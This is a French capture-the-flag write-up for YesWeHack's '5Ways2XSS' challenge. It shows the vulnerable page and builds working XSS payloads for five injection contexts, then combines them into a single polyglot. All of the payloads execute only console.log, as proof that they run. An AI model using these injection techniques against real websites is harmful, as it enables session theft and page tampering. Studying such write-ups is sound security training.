---
title: "Writeup 5Ways2XSS - DOJO #23 | YesWeHack"
date: 2023-05-15T12:00:00Z
description: "5Ways2XSS - DOJO #23 | YesWeHack"
categories: ["writeup"]
tags: ["xss","tuto","writeup"]
keywords: ["tuto", "xss","polyglot","ctf","bypass"]
---

## /Hint

Concentrez-vous sur une section XSS à la fois pour éviter les maux de tête ! 😉  
Aussi... les barres obliques **(/)** sont votre meilleur ami, qui a même besoin d'espaces de nos jours... ?

## / Rules

Une solution valable doit répondre à toutes ces exigences :
- (1) XSS classique par l'utilisation de balises HTML
- (2) XSS en restant à l'intérieur des balises originales *\<script>*.  
- (3) XSS à l'intérieur de la valeur 'src' *(Ne pas sortir des guillemets)*
- (4) XSS à l'intérieur de la balise '<XSS>' *(Ne créez pas une nouvelle balise HTML ou ne brisez pas la balise originale)*
- (5)  Exécuter une DOM XSS en restant à l'intérieur de la valeur d'entrée *(Ne pas sortir des guillemets)*


## /GOAL
**Suivre les règles et écrire une charge utile XSS unique qui s'exécute sur les cinq entrées différentes ($xss)**


## /Source Code
```html
<!DOCTYPE html>
<html>
<head><title>5Ways2XSS</title></head>
<body>
<center><h1>Master the art of creating your own payloads</h1></center>

<br><!--(1) Classic XSS by using HTML tags -->
(1) $xss
<br><!--(2) XSS inside the script tags-->
(2) <script>var v = {'xss':`$xss`};</script>
<br><!--(3) XSS inside the 'src' (stay inside) -->
(3) <script src="$xss"></script>              
<br><!--(4) XSS inside the '<xss>' tag (stay inside) -->
(4) <XSS $xss>
<br><!--(5) Execute a DOM XSS by staying *inside the input value* (no outbreak). Tip: Understanding how the <script> handles your value-->                                         
(5) <input type="search" id="inpt" value="$xss">    
<p id="dom"></p>
<script>
  var v = document.getElementById('inpt').value
  console.log("[DEBUG] (5) =>", v)//DEBUG
  document.getElementById('dom').innerHTML = '<img src="x" alt="'+v+'">';
</script>


<!--[The code *below* is for design purposes only. It is not a part of the challenge]-->
<marquee direction="right"><b>...XSS</b><img id="a" src="https://media4.giphy.com/media/QU86X0DlOCBCL5feZZ/giphy.gif"><img id="a" src="https://media2.giphy.com/media/kyuWvPj8enRVAeUvfO/giphy.gif"></marquee><style>#a{width: 64px;height:64px;}</style>
</body>
</html>
```


## Première approche:

Le but de ce challenge est clair: trouver un payload qui valide 5 XSS dans 5 contextes différents.  
Commencons pas comprendre le code.

On nous propose un champ pour entrer notre payload et celui-ci est directement remplacé dans le *code HTML* à la place de **$xss**.

J'ai déja eu affaire à ce type de challenge par le passé, nottament lors du forum leHack à Paris en juin dernier. *(BitK on te voit ;))*  

Le plus dur dans ce type de challenge n'est pas de trouver les payloads valides pour chaque XSS mais bien les combiner entre eux pour former un unique payload polyglotte.

## Partie 1) Résolution des XSS séparement:

Dans un premier temps, on s'intérèsse séparement aux XSS pour bien comprendre leur méthode de fonctionnement.

### XXS N°1: *XSS classique par l'utilisation de balises HTML*
Ici rien de plus simple, on peut directement injecter un **img**:
```html
(1) $xss
```
Payload: ``<img/src/onerror=console.log(1)>``

### XXS N°2: *XSS en restant à l'intérieur des balises \<script> d'origine*
L'idée ici est de sortir du contexte du dictionnaire tout en restant dans le TAG **script**.
```html
(2) <script>var v = {'xss':`$xss`};</script>
```
devient:
```html
(2) <script>var v = {'xss':``}; console.log(2); //`};</script>
```
avec le payload: `` `}; console.log(2); //``

### XXS N°3: *XSS à l'intérieur de la valeur 'src'*
Voici le code html:
```html
(3) <script src="$xss"></script>
```
Deux solutions sont possibles pour le moment:
  - utiliser **$xss** pour importer du code js depuis une page externe
  - utiliser **data:**

#### Possibilité 1:
Payload: ``https://vozec.fr/xss``  
Sur mon site: **/xss** retourne ``console.log(3)``

#### Possibilité 2:
[Data doc.](https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/Data_URLs)  
On utilise ce type de payload: ``data:[<mediatype>][;base64],<data>``  
Ici, aucun encoding n'est requis, de plus *text/plain* est l'encoding par default ce qui nous arrange puisque cela nous évite d'entrer un */* qui pourrait potentiellement nous déranger pour la suite.

Payload: ``data:,a=console.log(3)``

*(C'est cette dernière méthode que je retiendrai pour la suite. Elle est plus simple et plus concise.)*

### XXS N°4: *XSS à l'intérieur de la balise '\<XSS>'*
Code HTML
```html
(4) <XSS $xss>
```
Les règles sont stricts, nous ne pouvons modifier le tag *XSS* ni le fermer !

J'ai trouvé ici une unique solution pour trigger une XSS dans ce contexte:
- Utiliser les XSS précédente ainsi que l'attribut *onfocus* pour déclencher la XSS

Voici mon payload:
```js
id=x onfocus=console.log(4) tabindex=1
```

Malheuresement, l'attribut *autofocus* ne foncionne pas ce qui implique l'utilisation des précédentes XSS pour trigger celle-ci.
```html
Blocked autofocusing on a <xss> element in a cross-origin subframe.
```

En utilisant la *XSS N°1*, on peut sélectionner le tag *XSS* et utiliser la fonction **focus()** de celui ci.

```js
id=x onfocus=console.log(4) tabindex=1 wtf='<img/src/onerror=console.log(1);document.getElementById(String.fromCharCode(120)).focus();>'
```

### XXS N°5: *Exécuter un DOM XSS en restant à l'intérieur de la valeur d'entrée.*

Voici le code html associé:

```html
(5) <input type="search" id="inpt" value="$xss">    
<p id="dom"></p>
<script>
  var v = document.getElementById('inpt').value
  console.log("[DEBUG] (5) =>", v)//DEBUG
  document.getElementById('dom').innerHTML = '<img src="x" alt="'+v+'">';
</script>
```

Notre payload est d'abord inscrit dans *value* puis celui-ci est récupéré par le code js afin d'être inséré dans une balise *img*.  
Le tricks ici est que notre entrée est évalué une première fois avant d'être re-parsé par la suite par le code js.

Le payload désirée dans la balise *img* est: ``"+onerror=console.log(5)+"`` afin de former:
```html
<img src="x" alt=""+onerror=console.log(5)+"">
```

On peut donc envoyer:
- ``&quot; onerror=console.log(5) &quot;``  
ou  
- ``\" onerror=console.log(5) \"``  
pour complèter cette dernère XSS.

## Partie 2) Création du payload polyglotte:

On va ici partir du payload le plus compliqué et le moins permissif dans son contexte puis on va petit à petit lui ajouter les autres un par un.

Les 2 premiers sont trés facilement plaçable, de même le dernier peut facilement être en fin de payload, nous nous en occuperons à la fin.

Le plus compliqué est de faire fonctionner le 2ème et le 3ème ensemble:

#### Explication:

Le payload doit obligatoirement commencer par ``data:``, en effet c'est l'unique syntaxe qui permet de charger du javascript sans faire de requètes dans le paramètre **src** de la balise **script**.

De plus, la *XSS 4* impose d'avoir une suite chaines de caractères de la forme:
``clef=valeure`` *(attribut de la balise \<XSS>)*

J'ai donc utilisé la 2ème solution présenté précédemment pour la *XSS 3 et ** pour former:  
```html
data:,a=console.log(3)// id=x onfocus=console.log(4) tabindex=1
```

- Le contexte de la *XSS 3* interprète ce payload comme :  
  ``data:,`` + ``a=console.log(3)`` + ``//`` + *(commentaire)*  
  La balice *\<script>* charge donc *a=console.log(3)*

- Le contexte de la *XSS 4* interprète ce payload comme :  
  (``data:,a=`` + ``console.log(3)//``) + (``id`` = ``...``)  
  Ici *data:,a* est la clef et *console.log(3)//* la valeure.

### Ajout de la *XSS 1 et 2*

Toujours avec les mêmes restrictions du contexte de la balise *<XSS>*, nous pouvons ajouter un attribut custom avec le code des 2 premières XSS:
```js
vozec='`}; console.log(2); //<img/src/onerror=console.log(1);>'
```


### Ajout de la *XSS 5*

On termine avec la deuxième option évoquée:
```js
&quot; onerror=console.log(5) &quot;
```

### Focus sur le tag *<XSS>*

Pour activer la 4ème xss, il est nécessaire de déclencher le handler *onfocus*.  
On peut donc utiliser la 5ème XSS pour me réaliser.
On rajoute: ``document.getElementById(String.fromCharCode(120)).focus();``

# Payload Finale:
```js
data:,a=console.log(3)// id=x onfocus=console.log(4) tabindex=1 vozec='`}; console.log(2); //<img/src/onerror=console.log(1);>'&quot; onerror=console.log(5);document.getElementById(String.fromCharCode(120)).focus(); &quot;
```

# Upgrade:
J'ai par la suite upgrade ma payload de la sorte:
```js
data:,a=console.log(3)# onfocus='console.log(4)//<body onload=document.getElementById((false+String)[0]).focus();console.log(1);>`}; console.log(2);//'id=f tabindex=1 &quot; onerror=console.log(5);&quot;
```


![Alt text](./img/poc.png)
